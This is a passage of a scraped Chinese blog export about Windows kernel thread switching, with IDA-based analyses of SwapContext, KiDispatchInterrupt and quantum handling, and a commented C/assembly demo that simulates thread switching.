参考笔记：张嘉杰的笔记","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"分析SwapContext","slug":"分析SwapContext","date":"2020-04-03T14:46:28.000Z","updated":"2020-05-13T12:22:26.262Z","comments":true,"path":"2020/04/03/分析SwapContext/","link":"","permalink":"http://cata1oc.github.io/2020/04/03/%E5%88%86%E6%9E%90SwapContext/","excerpt":"","text":"SwapContext这个函数是Windows线程切换的核心，无论是主动切换还是系统时钟导致的线程切换，最终都会调用这个函数。在这个函数中，除了切换堆栈以外，还做了一些其它事情，了解这些细节对我们学习操作系统至关重要。 遗留问题在分析SwapContext函数之前，来回顾两个之前的文章中并没有交代的问题： 我们知道，在程序从3环进入0环时，会发生权限的切换，这就意味着堆栈发生了切换，也必然，线程发生了切换。之前学习过，3环进入0环，有两种方式，分别是中断门进0环以及快速调用。这里我们来简单的回顾一下： 通过中断门进0环时，会从TSS中获取到esp0的值。 快速调用进入0环时，则是从MSR寄存器中获取esp0的值，但是实际情况是，在分析快速调用进0环使用的KiFastCallEntry函数时，我们发现，快速调用进入0环时也是通过TSS来获取esp0的值的，所以MSR寄存器给的值，实际上只是作为中间过渡用 那么问题来了，TSS寄存器里面的这个esp0，到底是哪来的？如何保证每次切换线程后，TSS中的esp0对应的仍然是当前线程的esp0呢？分析SwapContext函数时便会找到答案。 另一个问题呢，是关于FS的；我们知道FS:[0]寄存器在3环时指向TEB，进入0环后FS:[0]指向KPCR；系统中同时存在很多个线程，那该如何保证FS:[0]在3环时一定是指向的当前正在运行的线程呢？同样，想知道这个答案，我们也需要通过分析SwapContext函数来解开。 SwapContextSwapContext函数比较长，就分为5个部分来进行分析，当然，这5个部分是连续的。另外，由于我已经在IDA中分析好了，这里就不贴上源码，直接通过图片来分析了。 Part1 来看看这部分做了些啥事，首先将目前线程(即将切换的线程)的线程状态置为2。这一部分有几个外部通过寄存器传进来的参数的含义，具体可以看图 第二步将Eflags入栈，在线程切换时，会有很多判断操作，势必会影响到标志寄存器的值，这里需要保存一下 接下来的4行，放在一起看。这里有两个操作： 1）将ExceptionList入栈，由于将发生线程切换，需要保存当前线程的异常链表。ebx指向的KPCR，所以[ebx]的值刚好是KPCR的第一个成员NtTib内的第一个成员，也就是ExceptionList 2）KPCR+0x994的位置是DPCRoutineActive，DPC是延迟过程调用，和APC相对，这里不再扩展，需要注意一点，这个会有个判断，如果DPCRoutineActive的值不为0，那就执行蓝屏程序 第四步，这个_PPerfGlobalGroupMask，仅仅在Windows Server2003中，5.2版本出现的一个字段，位于NtTib+0x08的位置，主要与日志，调式相关的。 到这就差不多了，接下来从mov ebp, cr0这条指令开始，开始第二部分的分析 Part2 来看第二部分，先让edx获取当前线程的Cr0寄存器的值。这里仅作暂存，具体后面会用到 KPCR中需要保存当前线程的相关信息，所以接下来，获取到目标线程的DebugActive写入到KPCR的DebugActive位上 这一步，比较好理解。毕竟一会要进行线程切换，总不能切换到一半去执行别的任务吧。因此就把中断屏蔽了 保存当前线程的esp到KernelStack字段中，这是我们熟知的经典线程切换操作的第一步。为什么没有紧接着进行第二步的操作呢？因为还有一些细节需要处理。接着往下看 第五步，主要做一些准备工作，这里能有两个操作，分别来看看 1）将目标线程的StackLimit保存到KPCR的StackLimit位置上 2）将目标线程的InitialStack处的值减去0x210后，赋到StackBase上。为什么要减去0x210呢？这里涉及到了内核堆栈的结构 每个线程的内核堆栈，栈底开始共有0x210个字节用于存储浮点寄存器相关的内容。因此KPCR中记录的栈基址需要减去0x210个字节 第六步，仍然是与浮点寄存器相关，在KTHREAD+0x031的位置，有一个字段叫做NpxState。这里主要是判断NpxState有没有浮点支持，以及上一个线程和当前线程对于浮点的支持是否相同，来决定是否需要重新修改Cr0寄存器的值。 下一部分，从loc_80004983开始 Part3 这部分内容较多，慢慢来看，第一步eax-0x10，结合Part2的分析可以知道，eax刚刚提升了0x210个字节，用于存储浮点寄存器相关内容，这里又提升0x10个字节的目的，同样可以根据上图可知，_Trap_Frame结构的开始部分，有0x10字节存储的内容是用于虚拟8086模式下的值，因此这里再次提升0x10字节的堆栈 第二步是最为关键的一步，这里实现了两个关键的操作： 1）将eax存的值赋值给TSS.esp0的位置，之前分析3环进0环时，有提到过，进入0环后的esp的位置，这里回顾一下： 而此时，eax所存的值，刚好位于快速调用进0环后esp所处的位置(InitialStack-0x210-0x10)。所以这个值，就是3环进0环后esp0的值，此处将这个值赋值给了TSS.esp0，自然也就解释了为什么TSS中存的esp0总是指向当前线程的0环堆栈，原因就是，每次堆栈切换发生时，SwapContext函数内，都会将切换后，线程堆栈栈顶存储到TSS.esp0的位置 2）第二个操作，哎，是我们非常熟悉的线程切换的经典步骤第二步，切换堆栈。这里就不多解释了，总之，至此，堆栈切换完成了，但是还是有一些善后工作需要处理。相比海哥的ThreadSwitch模拟切换函数来说，SwapContext还是略微复杂些的。 第三步，很容易看懂，设置KPCR.NtTib.Self指向Teb。这步有啥用呢？到Part4就能明白啦 第四步，就做了一个事，判断线程切换前后的2个线程，是不是属于同一个进程，方法也很简单，分别取两个线程KTHREAD+0x44位置指向的值（这里要注意下，在KTHREAD+0x34的偏移处，有一个ApcState结构体，其中+0x10位置存着指向当前线程所属进程的指针） 然后比较一下，若值不相同的话，那就将新的线程所属进程结构体的指针保存到edi中 第五步，紧接着第四步继续，如果俩线程的所属进程不同，就会走到这一步。这一步也有两个操作： 1）因为进程切换了，因此Cr3的值也要跟着变，因此这里从新的进程中获取Cr3，并保存到TSS中 2）同理，另一个需要更新的值，IO位图，也就是TSS最后一个元素，当然，这个值不重要，详情见图 下一部分，从loc_800049D7开始 Part4 这一部分，也就做一些收尾工作了，毕竟线程切换已经完了嘛。这里的第一步，最为关键。Part3的第三步，让KPCR.NtTib.Self指向了Teb。这里就用上了。我们有了这个Teb的地址后，就通过移位，将这个地址分3个部分(根据段描述符的结构)，写入到GDT表中，下标为7的这个段描述符中。这个段描述符对应的段选择子是0x3B，也就是3环FS寄存器存着的段选择子。这就解释了文章开头提到的第二个问题，为什么3环FS:[0]指向的一定是当前线程的Teb，原因就在这里，因为每次线程切换时，都会给3环FS:[0]对应的段描述符赋上当前线程Teb的地址 第二步，主要做了一些统计相关的操作，例如，CPU发生了多少次线程切换，以及这个线程被切换了多少次 第三步，主要做了一些恢复现场的工作，具体看图中注释。 总结至此，SwapContext函数已分析完毕，我们进一步了解了线程切换的细节，以及线程切换时，对TSS，FS的影响 参考教程： https://www.bilibili.com/video/BV1NJ411M7aE?p=51 https://www.bilibili.com/video/BV1NJ411M7aE?p=52 参考文章：https://blog.csdn.net/weixin_42052102/article/details/83217867 参考笔记：张嘉杰的笔记，Joney的笔记","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"},{"name":"Windows逆向","slug":"Windows逆向","permalink":"http://cata1oc.github.io/tags/Windows%E9%80%86%E5%90%91/"}]},{"title":"时间片管理与备用线程","slug":"时间片管理","date":"2020-04-02T08:11:54.000Z","updated":"2020-04-03T02:04:01.151Z","comments":true,"path":"2020/04/02/时间片管理/","link":"","permalink":"http://cata1oc.github.io/2020/04/02/%E6%97%B6%E9%97%B4%E7%89%87%E7%AE%A1%E7%90%86/","excerpt":"","text":"前一篇，我们主要分析了线程切换的几种情况，其中一种是时钟中断，但并不是说只要有时钟中断就一定会切换线程，时钟中断时，两种情况会导致线程切换： 当前线程的CPU时间片到期 存在备用线程（KPCR.PrcbData.NextThread处值不为空） CPU时间片ThreadQuantum当一个新的线程开始执行时，初始化程序会在KTHREAD.Quantum赋初始值，该值的大小由KPROCESS.ThreadQuantum决定 随机选择一个进程查看，发现ThreadQuantum的值为6。这个值，就是该进程的线程执行时的CPU时间片。那如何使用这个值呢？我们接下来继续看。 分析KeUpdateRunTime每次时钟中断发生时都会先调用KeUpdateRunTime函数，我们来看看这个函数干了什么事 结合两张图来看，ebx保存的是当前线程的KTHREAD，接着将当前线程的Quantum的值-3。这下就清晰一些了，前面说了，一个线程初始的Quantum值为6，这里将Quantum的值 减了3。然后还做了什么呢，根据上面的信息，可以得知eax保存的KPCR，下面有一个逻辑判断，如果减3后值不为0，这里程序就跳转了，但是如果为0，此时程序会给KPCR+0x9AC处（QuantumEnd）的值赋上一个不为0的值，这个操作有什么用呢？往后看就知道了。 分析KiDispatchInterrupt这里小盆友可能会奇怪了，为什么突然就从KeUpdateRunTime就跳到这了呢？这里需要说明一下，KeUpdateRumTime函数，是每次时钟中断发生时都会调用的函数，这个函数做了两件事： 将当前线程的KTHREAD.Quantum的值减3 若Quantum的值减到了0，则会将KPCR.QuantumEnd的值置为一个不为0的数 之后这个函数就执行完了，接着，就是我们上一篇分析过的，时钟中断的执行流程，最终，在进行线程切换之前，会执行到KiDispatchInterrupt函数，接下来，就来看看刚刚修改过的两个值，和这个函数有何关系： 进入KiDispatchInterrupt函数，这里有一个判断，稍作分析 这里的ebx存着的是KPCR，然后程序会去判断KPCR.QuantumEnd处的值是否为0，如果不是0，说明时间片走完了，也就是KTHREAD.Quantum值被减为0了，这是就会进行跳转，图中会跳转到loc_404902的位置 跟到loc_404902的位置继续观察， 这里先将KPCR.QuantumEnd的值置零，然后跳转到KiQuantumEnd函数中继续执行（为什么先赋值，再清零呢？因为已经判断过了，已经跳转到这里了，将QuantumEnd的值置零，也是为了下一个执行的线程） 好，进入KiQuantumEnd函数 具体细节看图，这部分，主要是重新设置了当前这个线程的CPU时间片的值为ThreadQuantum。接着往下看 然后这个函数调用了KiFindReadyThread函数，在就绪队列中找到一个线程，接着就返回了 执行完KiQuantumEnd函数后，我们又回到了KiDispatchInterrupt函数 如果刚刚在KiFindReadyThread可以在就绪队列中找到一个线程，那么eax的值就不为空，如图，接下来会跳转到loc_4048BB的位置 接着看4048BB的位置 看到了我们熟悉的线程切换函数 小结通过分析KeUpdateRunTime和KiDispatchInterrupt函数，我们可以发现。在CPU时间片用完的情况下，当时钟中断发生时，会发生线程的切换，这里做个小结： 当一个新的线程开始执行时，初始化程序会在KTHREAD.Quantum赋初始值，该值的大小由KPRCOESS.ThreadQuantum决定 每次时钟中断会调用KeUpdateRunTime函数，该函数每次将当前线程Quantum减少3个单，如果减到0，则将KPCR.PrcbData.QuantumEnd的值设置为非0 KiDispatchInterrupt判断时间片到期后，调用KiQuantumEnd函数（重新设置时间片、找到要运行的线程） 备用线程这里我们直接定位到KiDispatchInterrupt的位置，看图 可以发现，这是刚刚判断时间片是否到期的位置，这里共有两个判断： 若CPU时间片到期（即KPCR.QuantumEnd的值为非0），则跳转，否则继续执行 若存在备用线程，则将备用线程取出。啥是备用线程呢？就是KPCR+0x128的位置，该处成员名称叫做NextThread，是一个KTHREAD结构。如果这个位置的值不为0，那么程序会继续执行 后面的事情，看图片也就知道了。取出备用线程后，会先将当前线程放入就绪链表。这里为什么不放入等待链表呢？因为该线程处于就绪状态，只是在时钟中断发生时CPU时间片走完了或者存在备用线程，所以不会放入等待链表中。 当然。如果两个判断都没有执行，程序会直接跳到最后，返回了，也就是不发生线程切换 总结 当前线程主动调用API： KiSwapThread -> KiSwapContext -> SwapContext 当前线程时间片到期：KiDispatchInterrupt -> KiQuantumEnd -> SwapContext 存在备用线程：KiDispatchInterrupt -> SwapContext 参考教程：https://www.bilibili.com/video/BV1NJ411M7aE?p=50 参考文章： https://blog.csdn.net/qq_41988448/article/details/103421772 https://blog.csdn.net/qq_38474570/article/details/104273704","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"Windows线程切换","slug":"Windows线程切换","date":"2020-04-01T15:36:56.000Z","updated":"2020-04-02T06:12:24.389Z","comments":true,"path":"2020/04/01/Windows线程切换/","link":"","permalink":"http://cata1oc.github.io/2020/04/01/Windows%E7%BA%BF%E7%A8%8B%E5%88%87%E6%8D%A2/","excerpt":"","text":"前一篇介绍了海哥写的一份Windows线程切换代码，通过对代码的分析和学习，我们知道了线程切换的本质就是堆栈的切换，其中有一个非常关键的函数：SwitchContext，当调用这个函数时，就会导致线程切换。同样，Windows也有一个用于线程切换的函数：KiSwapContext KiSwapContext分析我们先从这个函数开始说起，当然，相比海哥写的代码，Windows中切换线程的代码更为复杂，但本质还是一样的，这里不作详细分析，分析关键函数，找到KiSwapContext的核心实现。 首先定位到KiSwapContext 根据这几步，我们发现，外层函数传来了一个未知的参数ecx 我们跟进调用KiSwapContext的KiSwapThread 分析调用KiSwapContext的代码 可以发现，ecx的值，来源于KiFindReadyThread的返回值，顾名思义，这是一个在就绪队列中查找线程的函数，因此返回值应为一个KTHREAD 有了上面几步的分析，再回来看，就好理解了 这几步的含义是，先把当前运行的线程取出到edi中，然后将刚刚从就绪队列中取出来的线程，放到KPCR中。我们可以看到，目前esi，edi，分别存放了切换后将执行的线程和正在执行的线程，但这里没有实现，需要进一步跟进SwapContext函数。 进入SwapContext函数后，忽略细节，我们可以很快找到线程切换最精髓的两条语句 堆栈切换，回忆一下，上一篇海哥写的程序里，线程切换最关键的两条语句也是这样的原理，将esp保存到原线程的KernelStack中，并将新线程的KernelStack的值赋给esp，从而实现堆栈的切换，这也就是线程切换的本质。 主动切换函数调用过程在分析完KiSwapContext函数后，我们可以总结出这样一个调用过程： c1KiSwapThread -> KiSwapContext -> SwapContext(内部实现线程切换) 虽然，真正的切换是SwapContext函数实现的，但是经过分析，从KiSwapThread到KiSwapContext再到SwapContext是一个顺序执行的过程。所以我们可以认为，凡是调用了KiSwapThread函数，就一定会触发线程切换。 在IDA中查看KiSwapThread的交叉引用表 我们可以看到，一共有7个函数调用了KiSwapThread函数，说明执行这些函数时，都会发生线程切换 随机选取其中一个调用KiSwapThread的函数：KeWaitForSingleObject，查看KeWaitForSingleObject的交叉引用表 我们可以看到有很多函数都调用了KeWaitForSingleObject，这也意味着这些函数在执行时，都会发生线程切换，因为它们最终都会调用SwapContext函数 小结我们可以看到，Windows中绝大部分API都会直接或间接调用SwapContext这个函数，也就是说，只要调用这些API函数，就会发生线程切换，这种通过调用API函数导致的线程切换叫做主动切换。 时钟中断切换上面介绍了主动切换，需要依赖对系统API函数的调用才能触发。那么，如果不去主动调用系统API函数，该如何触发线程切换呢？这里介绍另一个导致线程切换的方式，通过时钟中断。 为何要采用时钟中断的方式呢？实际上我们在切换线程时，必须先让当前执行的线程停下来，保存了线程当前的环境后，再去切换线程。线程的暂停也意味着程序的暂停。那么，如何中断一个正在执行的程序呢？ 异常：例如缺页异常或者INT N指令 中断：例如时钟中断 系统时钟 （IDT表）中断号 IRQ 说明 0x30 IRQ0 时钟中断 在Windows操作系统中，每10~20毫秒便会触发一次时钟中断 想要获取当前版本Windows时钟间隔值，可使用Win32API：GetSystemTimeAdjustment 时钟中断的执行流程进入IDA，我们一起来分析一下时钟中断的执行流程 Alt+T 搜索_IDT，找到IDT表 之前中断门进0环学习过，int 2e执行的是KiSystemService，而时钟中断是int 30，所以我们可以很快定位它的中断例程是KiStartUnexpectedRange() 进入KiStartUnexpectedRange 发现里面跳转到了KiEndUnexpectedRange函数 继续跟进KiEndUnexpectedRange 内部跳转到函数KiUnexpectedInterruptTail 进入KiUnexpectedInterruptTail内部 在这个函数结束前，我们可以看到，它调用了一个外部函数HalEndSystemInterrupt，在导入表中可以看到，这个外部函数位于HAL.dll 用IDA打开hal.dll，找到HalEndSystemInterrupt继续分析，这个函数不大，一眼看完就可以发现，它又调用了一个外部函数KiDispatchInterrupt 我们再次进入导入表查看 巧了嘛！这个函数是ntoskrnl的，那我们又调回去了。。。 我们进入KiDispatchInterrupt康康 哦吼，我们发现了什么？这不是就是SwapContext嘛！就是线程切换函数！ 经过这么多步，终于找到了关键的函数，这里简单梳理一下流程 小结分析完时钟中断的执行流程可以发现，时钟中断最终会执行SwapContext函数，同样会发生线程切换。 异常处理还有一种导致线程切换的就是异常处理了。当程序发生异常时，会根据中断号，跳转到相应中断处理例程进行处理，也会导致线程的切换，这里不作详细分析了。具体的可以参考任务段这篇通过TSS模拟实现进程切换。本质同样是堆栈的切换。 关于进程切换本质上，进程的切换就是线程的切换，所以并不存在真正意义上进程的切换，与普通线程的切换相比，进程的切换仅仅是，两个线程不属于同一进程。因此在线程切换的过程中，Cr3换了，从而进程也就换了。 总结 如果一个线程不调用API，并且在代码中屏蔽中断（通过CLI指令），并且程序不会出现异常，那么当前线程将永久占有CPU（单核CPU占用率100%，2核CPU占用率50%） Windows并且是“抢占式”操作系统，所谓的“抢“必须是当前线程允许其它线程“抢”，否则是“抢”不到的 参考教程：https://www.bilibili.com/video/BV1NJ411M7aE?p=48 参考文章： https://blog.csdn.net/qq_41988448/article/details/103406636 https://blog.csdn.net/qq_38474570/article/details/104273704","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"模拟线程切换","slug":"模拟线程切换","date":"2020-03-31T13:15:33.000Z","updated":"2020-05-13T12:20:02.734Z","comments":true,"path":"2020/03/31/模拟线程切换/","link":"","permalink":"http://cata1oc.github.io/2020/03/31/%E6%A8%A1%E6%8B%9F%E7%BA%BF%E7%A8%8B%E5%88%87%E6%8D%A2/","excerpt":"","text":"我们知道CPU执行和调度的单位是线程，在有了线程结构体（ETHREAD）以及等待链表，调度链表的概念后，这一篇简单介绍一下线程切换，通过分析模拟线程切换的代码（源于滴水编程达人海东老师编写）来了解线程切换的过程及原理。 示例代码c123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261#include #include #define MAXGMTHREAD 0x100#define GMTHREADSTACKSIZE 0x80000#define GMTHREAD_CREATE 0x1#define GMTHREAD_READAY 0x2#define GMTHREAD_RUNING 0x4#define GMTHREAD_SLEEP 0x8#define GMTHREAD_EXIT 0x100#define _SELF abcd1234typedef struct //定义线程结构体{ char* name; //线程名 int Flags; //定义状态：Ready/Sleep/Running int SleepMillisecondDot; //休眠时间 void* InitialStack; //栈底 void* StackLimit; //栈限长 void* KernelStack; //栈顶 void *lpParameter; //线程函数参数 void (*func)(void *lpParameter); //线程函数}GMThread_t;int CurrentThreadIndex = 0;void* WindowsStackLimit = NULL;GMThread_t GMThreadList[MAXGMTHREAD] = {NULL, 0};void PushStack(unsigned int** Stackpp, unsigned int v);int RegisterGMThread(char* name, void (*func)(void* lpParameter), void* lpParameter); void InitGMThread(GMThread_t* GMThreadp, char* name, void (*func)(void* lpParameter), void * lpParameter); void GMThreadStartup(GMThread_t* GMThreadp);void Scheduling(void); void SwitchContext(GMThread_t* SrcGMThreadp, GMThread_t* DstGMThreadp);void GMSleep(int Milliseconds); void Thread1(void* lpParameter); void Thread2(void* lpParameter);void Thread3(void* lpParameter);void Thread4(void* lpParameter);int main(int argc, char* argv[]){ RegisterGMThread(\"Thread1\", Thread1, NULL); RegisterGMThread(\"Thread2\", Thread2, NULL); RegisterGMThread(\"Thread3\", Thread3, NULL); RegisterGMThread(\"Thread4\", Thread4, NULL); while(1) { Sleep(20); Scheduling(); } return 0;}//向栈中压入值void PushStack(unsigned int** Stackpp, unsigned int v) { *Stackpp -= 1; **Stackpp = v; return;}//将一个函数注册为单独线程执行int RegisterGMThread(char* name, void (*func)(void* lpParameter), void* lpParameter){ int i = 0; for (i=1; GMThreadList[i].name; i++) { if (0 == strcmp(GMThreadList[i].name, name)) { break; } } InitGMThread(&GMThreadList[i], name, func, lpParameter); return i;}//初始化线程的信息void InitGMThread(GMThread_t* GMThreadp, char* name, void (*func)(void* lpParameter), void * lpParameter){ unsigned char* StackPages; unsigned int* StackDWORDParam; GMThreadp->Flags = GMTHREAD_CREATE; GMThreadp->name = name; GMThreadp->func = func; GMThreadp->lpParameter = lpParameter; StackPages = (unsigned char*)VirtualAlloc(NULL, GMTHREADSTACKSIZE, MEM_COMMIT, PAGE_READWRITE); memset(StackPages, NULL, GMTHREADSTACKSIZE); GMThreadp->InitialStack = StackPages + GMTHREADSTACKSIZE; GMThreadp->StackLimit = StackPages; StackDWORDParam = (unsigned int*)GMThreadp->InitialStack; PushStack(&StackDWORDParam, (unsigned int)GMThreadp); PushStack(&StackDWORDParam, (unsigned int)9); PushStack(&StackDWORDParam, (unsigned int)GMThreadStartup); PushStack(&StackDWORDParam, 5); PushStack(&StackDWORDParam, 7); PushStack(&StackDWORDParam, 6); PushStack(&StackDWORDParam, 3); PushStack(&StackDWORDParam, 2); PushStack(&StackDWORDParam, 1); PushStack(&StackDWORDParam, 0); GMThreadp->KernelStack = StackDWORDParam; GMThreadp->Flags = GMTHREAD_READAY; return;}//启动线程的函数void GMThreadStartup(GMThread_t* GMThreadp){ GMThreadp->func(GMThreadp->lpParameter); GMThreadp->Flags = GMTHREAD_EXIT; Scheduling(); return;}//线程调度函数，这个函数使得当前线程让出CPU，从队列里重新选择一个线程执行void Scheduling(void){ int i; int TickCount; GMThread_t* SrcGMThreadp; GMThread_t* DstGMThreadp; TickCount = GetTickCount(); SrcGMThreadp = &GMThreadList[CurrentThreadIndex]; DstGMThreadp = &GMThreadList[0]; for (i=1; GMThreadList[i].name; i++) { if (GMThreadList[i].Flags & GMTHREAD_SLEEP) { if (TickCount > GMThreadList[i].SleepMillisecondDot) { GMThreadList[i].Flags = GMTHREAD_READAY; } } if (GMThreadList[i].Flags & GMTHREAD_READAY) { DstGMThreadp = &GMThreadList[i]; break; } } CurrentThreadIndex = DstGMThreadp - GMThreadList; SwitchContext(SrcGMThreadp, DstGMThreadp); }//切换线程__declspec(naked) void SwitchContext(GMThread_t* SrcGMThreadp, GMThread_t* DstGMThreadp) { __asm { push ebp mov ebp, esp push edi push esi push ebx push ecx push edx push eax mov esi, SrcGMThreadp mov edi, DstGMThreadp mov [esi + GMThread_t.KernelStack], esp //经典线程切换的实现，本质就是切换堆栈 mov esp, [edi + GMThread_t.KernelStack] pop eax pop edx pop ecx pop ebx pop esi pop edi pop ebp ret }}void GMSleep(int Milliseconds){ GMThread_t* GMThreadp; GMThreadp = &GMThreadList[CurrentThreadIndex]; if (GMThreadp->Flags != 0) { GMThreadp->SleepMillisecondDot = GetTickCount() + Milliseconds; GMThreadp->Flags = GMTHREAD_SLEEP; } Scheduling(); return;}void Thread1(void* lpParameter){ while(1) { printf(\"Thread1\\n\"); GMSleep(500); }}void Thread2(void* lpParameter){ while(1) { printf(\"Thread2\\n\"); GMSleep(200); }}void Thread3(void* lpParameter){ while(1) { printf(\"Thread3\\n\"); GMSleep(10); }}void Thread4(void* lpParameter){ while(1) { printf(\"Thread4\\n\"); GMSleep(1000); }} 代码分析上述代码较长，且每行长短不一，故注释较乱，这里进行一些简要分析 模拟线程结构体c12345678910111213typedef struct //定义线程结构体{ char* name; int Flags; //定义状态：Ready/Sleep/Running int SleepMillisecondDot; //线程等待时间 void* InitialStack; //栈底 void* StackLimit; //栈限长 void* KernelStack; //栈顶 void *lpParameter; //线程函数参数 void (*func)(void *lpParameter); //线程函数}GMThread_t; 这是这份代码里最重要的结构体，它定义了我们模拟线程的结构，实际上，就是一个乞丐版的ETHREAD，只是很多ETHREAD中的成员我们用不到，就省去了，但仍然可以模拟线程切换的过程，这也算是个五脏俱全的线程结构体，我们来看看都有哪些成员吧： name：很好理解，线程的名字，用于标记线程 Flags：线程的状态，我们可以根据线程的状态将它放入等待链表或者让它执行 SleepMillisecondDot：线程的休眠时间。 InitialStack/StackLimit/KernelStack：可以说这是线程切换最重要的3个成员，每个线程执行时都需要有自己的堆栈，而具体该如何分配堆栈就要依靠这3个值，InitialStack提供了线程的栈底(ebp)；KernelStack提供了栈顶(esp)；StackLimit决定了栈的边界，可以这样理解，该线程的堆栈只能位于[ebp, ebp+StakLimit]的范围内，一旦超出这个范围，就会发生错误 lpParameter/func：分别是线程函数参数和线程函数，可以执行特定函数显示具体线程 全局变量和宏c1234567891011#define MAXGMTHREAD 0x100#define GMTHREADSTACKSIZE 0x80000#define GMTHREAD_CREATE 0x1#define GMTHREAD_READAY 0x2#define GMTHREAD_RUNING 0x4#define GMTHREAD_SLEEP 0x8#define GMTHREAD_EXIT 0x100int CurrentThreadIndex = 0;GMThread_t GMThreadList[MAXGMTHREAD] = {NULL, 0}; MAXGMTHREAD：指明线程最多能有多少个 GMTHREADSTACKSIZE：这里说的是线程分配的堆栈能有多大，每个线程都拥有自己的堆栈，但是不能无限大，大小的限制由KTHREAD结构里的KernelStack决定 GMTHREAD_CREATE/READAY/RUNING/SLEEP/EXIT：均为线程的状态 CurrentThreadIndex：可以理解为Index，用于遍历，这里作为全局变量进行声明。 GMThreadList：这里的类型是GMThread_t，说明这是模拟线程结构体链表，在KTHREAD结构体中，使用了WaitListEntry和SwapListEntry，根据线程的状态，将线程放入不同的链表中。这里，海东老师只用了一个数组，用来存放线程，其中下标0的位置，存放主函数的线程，其余位置存放不同状态的线程。 主函数c1234567891011121314int main(int argc, char* argv[]){ RegisterGMThread(\"Thread1\", Thread1, NULL); //注册线程1， 2， 3，4 RegisterGMThread(\"Thread2\", Thread2, NULL); RegisterGMThread(\"Thread3\", Thread3, NULL); RegisterGMThread(\"Thread4\", Thread4, NULL); while(1) { Sleep(20); //短暂等待 Scheduling(); //线程调度 } return 0 程序是从主函数开始执行的，我们按照函数执行的顺序进行分析 RegisterGMThread()：将一个函数注册为单独的线程来执行 Scheduling()：调度函数，使得当前线程让出CPU，并从队列中（GMThreadList）重新选择一个线程执行 线程注册函数c123456789101112131415int RegisterGMThread(char* name, void (*func)(void* lpParameter), void* lpParameter){ int i = 0; for (i=1; GMThreadList[i].name; i++) { if (0 == strcmp(GMThreadList[i].name, name)) { break; } } InitGMThread(&GMThreadList[i], name, func, lpParameter); return i；} 参数：线程名，线程函数，线程函数参数 前面提到了，下标0的位置，存放着是main线程，所以这里从下标1开始写入，对数组中未初始化的线程通过初始化函数InitiGMThread()进行初始化 压栈函数c1234567void PushStack(unsigned int** Stackpp, unsigned int v) { *Stackpp -= 1; //栈减一个int长度，就是4字节 **Stackpp = v; //并在这个位置存值 return;} 在介绍线程初始化函数前，先看一下这个压栈函数，这个函数非常简单，传了2个参数，一个指针，一个数。压栈函数的作用就是，指针-1（因为是*Stackpp，所以减的是int类型，即4字节），并在压栈后的地址存这个数，文字叙述可能不好理解，我们把这个转换一下就好理解了，其实就是代码实现的一个简单压栈操作 Code1234567891011_asm { sub esp, 4 mov eax, v mov esp, eax}or _asm { push v} 线程初始化函数c123456789101112131415161718192021222324252627282930313233343536373839void InitGMThread(GMThread_t* GMThreadp, char* name, void (*func)(void* lpParameter), void * lpParameter){ unsigned char* StackPages; unsigned int* StackDWORDParam; //初始化线程结构体 GMThreadp->Flags = GMTHREAD_CREATE; GMThreadp->name = name; GMThreadp->func = func; GMThreadp->lpParameter = lpParameter; //分配80个连在一起的可以直接用的物理页 StackPages = (unsigned char*)VirtualAlloc(NULL, GMTHREADSTACKSIZE, MEM_COMMIT, PAGE_READWRITE); //将分配的内存先都清0 memset(StackPages, NULL, GMTHREADSTACKSIZE); //设置栈底ebp GMThreadp->InitialStack = StackPages + GMTHREADSTACKSIZE; //设置栈的最大上限 GMThreadp->StackLimit = StackPages; //将ebp赋值StackDWORDParam StackDWORDParam = (unsigned int*)GMThreadp->InitialStack; PushStack(&StackDWORDParam, (unsigned int)GMThreadp); PushStack(&StackDWORDParam, (unsigned int)9); PushStack(&StackDWORDParam, (unsigned int)GMThreadStartup); PushStack(&StackDWORDParam, 5); //ebp PushStack(&StackDWORDParam, 7); //edi PushStack(&StackDWORDParam, 6); //esi PushStack(&StackDWORDParam, 3); //ebx PushStack(&StackDWORDParam, 2); //ecx PushStack(&StackDWORDParam, 1); //edx PushStack(&StackDWORDParam, 0); //eax //令KernelStack指向栈顶esp GMThreadp->KernelStack = StackDWORDParam; //修改线程状态Create->Ready GMThreadp->Flags = GMTHREAD_READAY; return;} 线程初始化：线程初始化总共分为2步，一个是对线程结构体的初始化，另一个是对线程所在堆栈的初始化 线程结构体初始化：对代码中定义的简约版线程结构体GMThread_t中的部分成员进行初始化，包括线程状态，线程名，线程函数及参数。 线程堆栈初始化：我们知道，每一个线程，都得有属于自己堆栈，总不能跑到别人的堆栈上执行吧，这样就乱套了因此线程得拥有自己的堆栈。来看一下模拟线程切换的代码中是如何实现的： 第一步用VirutalAlloc函数申请一块连续的内存（分配类型使用MEM_COMMIT） 初始化这块内存（置零） 设置栈底，栈顶，边界，这部分非常关键，也是设置线程堆栈的核心步骤。在KTHREAD结构中，有InitialStack/StackLimit/KernelStack决定线程的堆栈相关参数。本次的模拟程序里也定义了这三个成员，我们来看下他们是如何运作的。 InitialStack：这个成员相当于栈底，也就是ebp，在Windows中，堆栈的由高地址向低地址延申的，所以这里设置ebp的值为申请内存的首地址+堆栈限制大小 StackLimit：这个成员定义栈的边界，栈的范围应在[InitialStack - StackLimit, InitialStack]内，这里令其等于申请内存的首地址，因为栈由高地址向下延申，因此栈的边界会位于此处 KernelStack：这个成员指向栈顶，相当于esp。这里的几步非常关键，按照顺序依次push了线程结构体，一个数，一个执行线程的函数GMThreadStartup()，接着又是一堆数，最后，将栈顶（通过压栈函数减了很多次），赋值给了KernelStack 以上就是线程初始化最关键的部分，可以参考这张图 